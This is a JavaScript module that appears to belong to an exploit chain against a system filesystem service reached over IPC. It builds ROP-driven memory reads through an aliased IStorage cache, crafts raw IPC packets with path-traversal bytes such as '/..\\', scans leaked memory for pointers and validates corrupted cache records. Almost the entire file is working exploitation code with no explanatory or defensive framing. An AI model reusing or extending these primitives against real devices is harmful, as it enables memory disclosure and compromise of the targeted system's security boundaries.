import coreRuntime from "../runtime.mjs";

const {
    AnalysisBytes,
    GADGET_MEMSET,
    allocPage,
    call_rop,
    closeHandle,
    hex32,
    ipcStorageRead,
    prepPacket,
    read32,
    read64,
    read8,
    sendIPC,
    write32,
    write8,
    writeXDesc
} = coreRuntime;

// ----- Cache-mapped memory I/O -----

/**
 * Read a bounded address window through the candidate IStorage cache alias.
 *
 * The destination is poison-filled first, so an untouched IPC output cannot pass
 * for real data. A read that is not materialized has to fit one aligned cache
 * chunk, and it returns the caller's buffer.
 *
 * @returns {object} Read result; failures mark `fatal` when retrying is unsafe.
 */
export function readFsAddressBytes(input) {
    const config = input.config;
    const addressPlan = input.addressPlan;
    const candidateHandle = input.candidateHandle;
    const address = input.address;
    const length = input.length;
    const outputBuf = input.outputBuf;
    const allowedWindow = input.allowedWindow;
    const materializeBytes = input.materializeBytes;

    if (allowedWindow &&
        (!Number.isSafeInteger(allowedWindow.start) ||
            !Number.isSafeInteger(allowedWindow.end) ||
            allowedWindow.end <= allowedWindow.start)) {
        return {ok: false, error: "explicit address window is invalid"};
    }

    var allowedStart = 0;

    if (allowedWindow) {
        allowedStart = allowedWindow.start;
    } else if (addressPlan && addressPlan.lowerWindow) {
        allowedStart = addressPlan.lowerWindow.proposedStart;
    }

    var allowedEnd = 0;

    if (allowedWindow) {
        allowedEnd = allowedWindow.end;
    } else if (addressPlan) {
        allowedEnd = addressPlan.target + config.CONTROL_SIZE;
    }

    if (isAddressReadOutsideAllowedWindow(address, length, addressPlan, allowedStart, allowedEnd)) {
        return {ok: false, error: "address is outside its explicit bounded window"};
    }

    var copyBytes = materializeBytes !== false;
    var bytes = copyBytes ? [] : null;
    var currentAddress = address;
    var remaining = length;
    while (remaining > 0) {
        var fileOffset = currentAddress - addressPlan.addressBias;
        var bucketIndex = Math.floor(fileOffset / config.CONTROL_SIZE) *
            config.CONTROL_SIZE % config.ROOT_CAPTURE_CHUNK;
        var requestOffset;
        var prefix = 0;
        var take;

        if (bucketIndex === 0) {
            requestOffset = fileOffset;
            take = Math.min(remaining, config.ROOT_CAPTURE_CHUNK);
        } else {
            requestOffset = Math.floor(fileOffset / config.ROOT_CAPTURE_CHUNK) *
                config.ROOT_CAPTURE_CHUNK;
            prefix = fileOffset - requestOffset;
            take = Math.min(remaining, config.ROOT_CAPTURE_CHUNK - prefix);
        }

        var requestSize = prefix + take;

        if (!copyBytes && (prefix !== 0 || take !== length ||
            remaining !== length)) {
            return {ok: false,
                error: "buffer-only reads require one aligned cache chunk"};
        }

        if (isAlignedReadOutsideAllowedWindow(addressPlan, requestOffset, requestSize, allowedStart, allowedEnd)) {
            return {ok: false, error: "aligned read is outside its explicit bounded window"};
        }

        call_rop(GADGET_MEMSET, outputBuf, 0xA5n, BigInt(requestSize));
        var reply = ipcStorageRead(candidateHandle, requestOffset,
                                   requestSize, outputBuf);

        if (reply.error !== 0) {
            return {ok: false, fatal: true,
                error: "IStorage::Read=" + hex32(reply.error) + " transport=" + (reply.transport == null
                    ? "unknown" : hex32(reply.transport)) + " cmif=" + (reply.cmifError == null
                    ? "none" : hex32(reply.cmifError)) + " offset=0x" + requestOffset.toString(16) +
                    " size=0x" + requestSize.toString(16)};
        }

        var nonPoison = hasByteDifferentFast(outputBuf + BigInt(prefix), take, 0xA5);

        if (!nonPoison) {
            return {ok: false, fatal: true,
                error: "read window remained poison"};
        }

        if (copyBytes) {
            for (var i = 0; i < take; i++) {
                bytes.push(Number(read8(outputBuf + BigInt(prefix + i))));
            }
        }

        currentAddress += take;
        remaining -= take;
    }
    return {ok: true, bytes: bytes, buffer: outputBuf, bufferOffset: 0};
}





// ----- Formatting utilities -----

export function readHexBytes(addr, count) {
    var hex = "";
    for (var i = 0; i < count; i++) {
        hex += ("0" + Number(read8(addr + BigInt(i))).toString(16)).slice(-2);
    }
    return hex;
}

export function bytesToHex(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++) {
        out += ("0" + bytes[i].toString(16)).slice(-2);
    }
    return out;
}

/**
 * Validate the 0x570-byte cache tail of a 0x5A0-byte retained record. An all-zero
 * tail passes, and so does one well-formed path entry with zero padding.
 *
 * The caller has to provide the full record window; promotion and scan enforce that
 * bound.
 */
export function isSafeCacheTail(bytes, start) {
    const tail = bytes.slice(start, start + 0x570);

    if (tail.length !== 0x570) {
        return false;
    }

    let any = false;
    for (let i = 0; i < tail.length; i++) {
        any = any || !!tail[i];
    }

    if (!any) {
        return true;
    }

    let pathStart;
    let exactEightBytePath = false;

    if (tail[0] === 0x41) {
        pathStart = 0;
    } else if (tail[0] === 0 && tail[1] === 0x41) {
        pathStart = 1;
    } else if (AnalysisBytes.toHex(tail, 0, 8) === "0000400100000000") {
        pathStart = 8;
        exactEightBytePath = true;
    } else if (AnalysisBytes.toHex(tail, 0, 5) === "0000400100") {
        pathStart = tail[5] === 0 ? 6 : 5;
    } else {
        return false;
    }

    let end = -1;
    for (let ti = pathStart; ti < tail.length; ti++) {
        if (tail[ti] === 0) {
            end = ti - pathStart;
            break;
        }
    }

    if (end <= 0 || (exactEightBytePath && end !== 552)) {
        return false;
    }

    let hasSlash = false;
    for (let pi = 0; pi < end; pi++) {
        const value = tail[pathStart + pi];

        if (value !== 0x41 && value !== 0x2F) {
            return false;
        }

        if (value === 0x2F) {
            hasSlash = true;
        }
    }

    if (!hasSlash) {
        return false;
    }

    for (let zi = pathStart + end; zi < tail.length; zi++) {
        if (tail[zi] !== 0) {
            return false;
        }
    }
    return true;
}

/** Read an entry type from an already-built path buffer, without re-encoding it. */
export function ipcGetEntryTypeRawBytes(handle, bytes) {
    var pathBuf = allocPage(0x1000);
    for (var i = 0; i < bytes.length; i++) {
        write8(pathBuf + BigInt(i), BigInt(bytes[i]));
    }
    var inputMatches = true;
    for (var i = 0; i < bytes.length; i++) {
        if (Number(read8(pathBuf + BigInt(i))) !== bytes[i]) {
            inputMatches = false;
            break;
        }
    }

    var pkt = allocPage(0x2000);
    prepPacket(pkt, (4 | (1 << 16)) >>> 0, 8, []);
    writeXDesc(pkt, 8, pathBuf, bytes.length);
    write32(pkt + 0x10n, 0x49434653n);
    write32(pkt + 0x18n, 7n);
    var transport = Number(sendIPC(handle, pkt)) >>> 0;
    var type = Number(read32(pkt)) & 0xFFFF;
    var magic = Number(read32(pkt + 0x10n)) >>> 0;

    if (transport !== 0 || type !== 0 || magic !== 0x4F434653) {
        return {ok: false, transport: transport, type: type, magic: magic,
            result: 0xFFFFFFFF, canonical: 0xFFFFFFFF,
            inputMatches: inputMatches};
    }

    var result = Number(read32(pkt + 0x18n)) >>> 0;
    return {ok: true, transport: transport, type: type, magic: magic,
        result: result, canonical: result & 0x3FFFFF,
        inputMatches: inputMatches};
}

// ----- Address and encoding helpers -----

/** Prove the header encoder reproduces the expected bytes, before a copy wave relies on them. */
export function checkAddressHeaderEncoding(headerBytes, input) {
    const savedHandle = input.savedHandle;
    var prefix = [0x2F, 0x2E, 0x2E, 0x5C]; // "/..\\"
    var invalidBytes = prefix.concat([0xFF, 0]);
    var encodedBytes = prefix.concat(headerBytes, [0]);
    var invalid = ipcGetEntryTypeRawBytes(savedHandle, invalidBytes);
    var encoded = ipcGetEntryTypeRawBytes(savedHandle, encodedBytes);
    return {
        invalid: invalid,
        encoded: encoded,
        ok: invalid.ok && encoded.ok && invalid.inputMatches &&
            encoded.inputMatches && invalid.canonical === 0x2EEA02 &&
            encoded.canonical === 0x2EEC02
    };
}

/** Bytewise comparison, safe for any alignment. */
export function buffersEqual(a, b, length) {
    for (var i = 0; i < length; i++) {
        if (Number(read8(a + BigInt(i))) !==
            Number(read8(b + BigInt(i)))) {
            return false;
        }
    }
    return true;
}

/** Word-wise comparison; only valid when both addresses share the same alignment. */
export function buffersEqualFast(a, b, length) {

    /*
     * Whole-word comparison is only safe while both addresses share the same
     * alignment, so unequal ones stay on the general bytewise path.
     */
    if ((a & 7n) !== (b & 7n)) {
        return buffersEqual(a, b, length);
    }

    var alignment = Number(a & 7n);
    var prefix = alignment === 0 ? 0 : 8 - alignment;
    var offset = 0;
    var prefixEnd = Math.min(prefix, length);
    for (; offset < prefixEnd; offset++) {
        if (Number(read8(a + BigInt(offset))) !==
            Number(read8(b + BigInt(offset)))) {
            return false;
        }
    }
    for (; offset + 8 <= length; offset += 8) {
        if (read64(a + BigInt(offset)) !==
            read64(b + BigInt(offset))) {
            return false;
        }
    }
    for (; offset < length; offset++) {
        if (Number(read8(a + BigInt(offset))) !==
            Number(read8(b + BigInt(offset)))) {
            return false;
        }
    }
    return true;
}

export function hasByteDifferent(addr, length, value) {
    for (var i = 0; i < length; i++) {
        if (Number(read8(addr + BigInt(i))) !== value) {
            return true;
        }
    }
    return false;
}

export function hasByteDifferentFast(addr, length, value) {
    var repeatedWord = BigInt(value) * 0x0101010101010101n;
    var offset = 0;
    var alignment = Number(addr & 7n);
    var prefix = alignment === 0 ? 0 : 8 - alignment;
    var prefixEnd = Math.min(prefix, length);
    for (; offset < prefixEnd; offset++) {
        if (Number(read8(addr + BigInt(offset))) !== value) {
            return true;
        }
    }
    for (; offset + 8 <= length; offset += 8) {
        if (read64(addr + BigInt(offset)) !== repeatedWord) {
            return true;
        }
    }
    for (; offset < length; offset++) {
        if (Number(read8(addr + BigInt(offset))) !== value) {
            return true;
        }
    }
    return false;
}

/** Collect the canonical-looking pointers of a buffer, up to `limit` entries. */
export function scanPointerWords(addr, length, limit) {
    var found = [];
    for (var off = 0; off + 8 <= length && found.length < limit; off += 8) {
        var value = read64(addr + BigInt(off));

        if (value >= 0x100000000n && value < 0x8000000000n &&
            value % 8n === 0n) {
            found.push("+0x" + off.toString(16) + "=0x" +
                value.toString(16));
        }
    }
    return found.join(" ") || "none";
}

/**
 * Close every handle in the input bag, newest resources first, and report the ones
 * that refused to close. The setup steps call it when an early phase fails.
 */
export function cleanup(input) {
    const auxiliaryStorageHandle = input.auxiliaryStorageHandle;
    const candidateHandle = input.candidateHandle;
    let domainSession = input.domainSession;
    const extentTriggerHandle = input.extentTriggerHandle;
    const pinHandle = input.pinHandle;
    const rootClones = input.rootClones || [];
    const rootSession = input.rootSession;
    const saveClones = input.saveClones || [];
    const savedHandle = input.savedHandle;
    const storageHandle = input.storageHandle;
    const temporaryHandle = input.temporaryHandle;
    const preserveTemporaryHandleForCleanup =
        input.preserveTemporaryHandleForCleanup === true;
    const triggerHandle = input.triggerHandle;

    if (candidateHandle) {
        closeHandle(candidateHandle);
    }

    if (pinHandle) {
        closeHandle(pinHandle);
    }

    if (extentTriggerHandle) {
        closeHandle(extentTriggerHandle);
    }

    if (triggerHandle) {
        closeHandle(triggerHandle);
    }

    if (storageHandle) {
        closeHandle(storageHandle);
    }

    if (auxiliaryStorageHandle) {
        closeHandle(auxiliaryStorageHandle);
    }

    for (var i = 0; i < rootClones.length; i++) {
        closeHandle(rootClones[i]);
    }
    for (var i = 0; i < saveClones.length; i++) {
        closeHandle(saveClones[i]);
    }

    if (savedHandle) {
        closeHandle(savedHandle);
    }

    if (temporaryHandle && !preserveTemporaryHandleForCleanup) {
        closeHandle(temporaryHandle);
    }

    if (domainSession) {
        closeHandle(domainSession.handle);
        domainSession = null;
    }

    if (rootSession) {
        closeHandle(rootSession);
    }

    return {closed: true};
}

function isAddressReadOutsideAllowedWindow(address, length, addressPlan, allowedStart, allowedEnd) {
    return !Number.isSafeInteger(address) || !Number.isInteger(length) ||
        length <= 0 || !Number.isSafeInteger(address + length) ||
        !addressPlan || !addressPlan.lowerWindow ||
        !Number.isSafeInteger(allowedStart) ||
        !Number.isSafeInteger(allowedEnd) || allowedEnd <= allowedStart ||
        address < allowedStart || address + length > allowedEnd;
}

function isAlignedReadOutsideAllowedWindow(addressPlan, requestOffset, requestSize, allowedStart, allowedEnd) {
    return requestOffset < 0 || requestSize <= 0 ||
        requestOffset + requestSize > addressPlan.storageSize ||
        addressPlan.addressBias + requestOffset < allowedStart ||
        addressPlan.addressBias + requestOffset + requestSize > allowedEnd;
}
